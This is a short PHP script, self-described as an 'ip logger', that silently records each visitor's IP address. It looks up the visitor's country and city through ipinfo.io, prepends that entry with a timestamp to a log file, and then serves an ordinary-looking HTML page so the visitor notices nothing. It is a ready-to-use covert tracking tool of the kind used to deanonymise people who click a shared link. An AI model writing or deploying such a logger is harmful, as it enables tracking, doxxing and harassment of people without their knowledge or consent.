<?php

// b1g ip logger by kacper.win

$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
$country = (string) $details->country;
$city = (string) $details->city;
$toAdd = "[" . gmdate("M jS, Y - h:ia") . "] - {$country} - {$city} - {$ip}";
$current = file_get_contents('B1gLolzy.txt');
$new = $toAdd . PHP_EOL . $current;
file_put_contents('B1gLolzy.txt', $new);
echo file_get_contents ('Lolzy.html');

?>